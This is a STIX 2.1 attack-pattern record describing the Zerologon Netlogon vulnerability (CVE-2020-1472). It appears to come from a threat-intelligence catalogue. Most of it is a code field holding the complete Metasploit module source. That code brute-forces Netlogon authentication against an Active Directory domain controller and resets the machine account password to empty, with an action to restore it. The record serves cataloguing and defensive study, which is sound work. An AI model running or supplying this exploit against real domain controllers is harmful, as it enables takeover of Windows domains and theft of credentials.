{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8b7798f-649d-4156-b688-a59b4f852aee",
    "created": "2024-08-14T16:22:27.804484Z",
    "modified": "2024-08-14T16:22:27.804488Z",
    "name": "Netlogon Weak Cryptographic Authentication",
    "description": " A vulnerability exists within the Netlogon authentication process where the security properties granted by AES are lost due to an implementation flaw related to the use of a static initialization vector (IV). An attacker can leverage this flaw to target an Active Directory Domain Controller and make repeated authentication attempts using NULL data fields which will succeed every 1 in 256 tries (~0.4%). This module leverages the vulnerability to reset the machine account password to an empty string, which will then allow the attacker to authenticate as the machine account. After exploitation, it's important to restore this password to it's original value. Failure to do so can result in service instability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/dcerpc/cve_2020_1472_zerologon.rb",
            "external_id": "cve_2020_1472_zerologon.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1472"
        },
        {
            "source_name": "reference",
            "url": "https://www.secura.com/blog/zero-logon"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'windows_error'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Report\n\n  CheckCode = Exploit::CheckCode\n  Netlogon = RubySMB::Dcerpc::Netlogon\n  EMPTY_SHARED_SECRET = OpenSSL::Digest.digest('MD4', '')\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netlogon Weak Cryptographic Authentication',\n        'Description' => %q{\n          A vulnerability exists within the Netlogon authentication process where the security properties granted by AES\n          are lost due to an implementation flaw related to the use of a static initialization vector (IV). An attacker\n          can leverage this flaw to target an Active Directory Domain Controller and make repeated authentication attempts\n          using NULL data fields which will succeed every 1 in 256 tries (~0.4%). This module leverages the vulnerability\n          to reset the machine account password to an empty string, which will then allow the attacker to authenticate as\n          the machine account. After exploitation, it's important to restore this password to it's original value. Failure\n          to do so can result in service instability.\n        },\n        'Author' => [\n          'Tom Tervoort', # original vulnerability details\n          'Spencer McIntyre', # metasploit module\n          'Dirk-jan Mollema' # password restoration technique\n        ],\n        'Notes' => {\n          'AKA' => ['Zerologon'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        },\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          [ 'REMOVE', { 'Description' => 'Remove the machine account password' } ],\n          [ 'RESTORE', { 'Description' => 'Restore the machine account password' } ]\n        ],\n        'DefaultAction' => 'REMOVE',\n        'References' => [\n          [ 'CVE', '2020-1472' ],\n          [ 'URL', 'https://www.secura.com/blog/zero-logon' ],\n          [ 'URL', 'https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py' ],\n          [ 'URL', 'https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py' ]\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [ false, 'The netlogon RPC port' ]),\n        OptString.new('NBNAME', [ true, 'The server\\'s NetBIOS name' ]),\n        OptString.new('PASSWORD', [ false, 'The password to restore for the machine account (in hex)' ], conditions: %w[ACTION == RESTORE]),\n      ]\n    )\n  end\n\n  def peer\n    \"#{rhost}:#{@dport || datastore['RPORT']}\"\n  end\n\n  def bind_to_netlogon_service\n    @dport = datastore['RPORT']\n    if @dport.nil? || @dport == 0\n      @dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')\n      fail_with(Failure::NotFound, 'Could not determine the RPC port used by the Microsoft Netlogon Server') unless @dport\n    end\n\n    # Bind to the service\n    handle = dcerpc_handle(Netlogon::UUID, '1.0', 'ncacn_ip_tcp', [@dport])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n  end\n\n  def check\n    bind_to_netlogon_service\n\n    status = nil\n    2000.times do\n      netr_server_req_challenge\n      response = netr_server_authenticate3\n\n      break if (status = response.error_status) == 0\n\n      windows_error = ::WindowsError::NTStatus.find_by_retval(response.error_status.to_i).first\n      # Try again if the Failure is STATUS_ACCESS_DENIED, otherwise something has gone wrong\n      next if windows_error == ::WindowsError::NTStatus::STATUS_ACCESS_DENIED\n\n      fail_with(Failure::UnexpectedReply, windows_error)\n    end\n\n    return CheckCode::Detected unless status == 0\n\n    CheckCode::Vulnerable\n  end\n\n  def run\n    case action.name\n    when 'REMOVE'\n      action_remove_password\n    when 'RESTORE'\n      action_restore_password\n    end\n  end\n\n  def action_remove_password\n    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless check == CheckCode::Vulnerable\n\n    print_good('Successfully authenticated')\n\n    report_vuln(\n      host: rhost,\n      port: @dport,\n      name: name,\n      sname: 'dcerpc',\n      proto: 'tcp',\n      refs: references,\n      info: \"Module #{fullname} successfully authenticated to the server without knowledge of the shared secret\"\n    )\n\n    response = netr_server_password_set2\n    status = response.error_status.to_i\n    fail_with(Failure::UnexpectedReply, \"Password change failed with NT status: 0x#{status.to_s(16)}\") unless status == 0\n\n    print_good(\"Successfully set the machine account (#{datastore['NBNAME']}$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)\")\n  end\n\n  def action_restore_password\n    fail_with(Failure::BadConfig, 'The RESTORE action requires the PASSWORD option to be set') if datastore['PASSWORD'].blank?\n    fail_with(Failure::BadConfig, 'The PASSWORD option must be in hex') if /^([0-9a-fA-F]{2})+$/ !~ datastore['PASSWORD']\n    password = [datastore['PASSWORD']].pack('H*')\n\n    bind_to_netlogon_service\n    client_challenge = OpenSSL::Random.random_bytes(8)\n\n    response = netr_server_req_challenge(client_challenge: client_challenge)\n    session_key = Netlogon.calculate_session_key(EMPTY_SHARED_SECRET, client_challenge, response.server_challenge)\n    ppp = Netlogon.encrypt_credential(session_key, client_challenge)\n\n    response = netr_server_authenticate3(client_credential: ppp)\n    fail_with(Failure::NoAccess, 'Failed to authenticate (the machine account password may not be empty)') unless response.error_status == 0\n\n    new_password_data = (\"\\x00\" * (512 - password.length)) + password + [password.length].pack('V')\n    response = netr_server_password_set2(\n      authenticator: Netlogon::NetlogonAuthenticator.new(\n        credential: Netlogon.encrypt_credential(session_key, [ppp.unpack1('Q') + 10].pack('Q')),\n        timestamp: 10\n      ),\n      clear_new_password: Netlogon.encrypt_credential(session_key, new_password_data)\n    )\n    status = response.error_status.to_i\n    fail_with(Failure::UnexpectedReply, \"Password change failed with NT status: 0x#{status.to_s(16)}\") unless status == 0\n\n    print_good(\"Successfully set machine account (#{datastore['NBNAME']}$) password\")\n  end\n\n  def netr_server_authenticate3(client_credential: \"\\x00\" * 8)\n    nrpc_call('NetrServerAuthenticate3',\n              primary_name: \"\\\\\\\\#{datastore['NBNAME']}\",\n              account_name: \"#{datastore['NBNAME']}$\",\n              secure_channel_type: :ServerSecureChannel,\n              computer_name: datastore['NBNAME'],\n              client_credential: client_credential,\n              flags: 0x212fffff)\n  end\n\n  def netr_server_password_set2(authenticator: nil, clear_new_password: \"\\x00\" * 516)\n    authenticator ||= Netlogon::NetlogonAuthenticator.new(credential: \"\\x00\" * 8, timestamp: 0)\n    nrpc_call('NetrServerPasswordSet2',\n              primary_name: \"\\\\\\\\#{datastore['NBNAME']}\",\n              account_name: \"#{datastore['NBNAME']}$\",\n              secure_channel_type: :ServerSecureChannel,\n              computer_name: datastore['NBNAME'],\n              authenticator: authenticator,\n              clear_new_password: clear_new_password)\n  end\n\n  def netr_server_req_challenge(client_challenge: \"\\x00\" * 8)\n    nrpc_call('NetrServerReqChallenge',\n              primary_name: \"\\\\\\\\#{datastore['NBNAME']}\",\n              computer_name: datastore['NBNAME'],\n              client_challenge: client_challenge)\n  end\n\n  def nrpc_call(name, **kwargs)\n    request = Netlogon.const_get(\"#{name}Request\").new(**kwargs)\n\n    begin\n      raw_response = dcerpc.call(request.opnum, request.to_binary_s)\n    rescue Rex::Proto::DCERPC::Exceptions::Fault\n      fail_with(Failure::UnexpectedReply, \"The #{name} Netlogon RPC request failed\")\n    end\n\n    Netlogon.const_get(\"#{name}Response\").read(raw_response)\n  end\nend\n"
}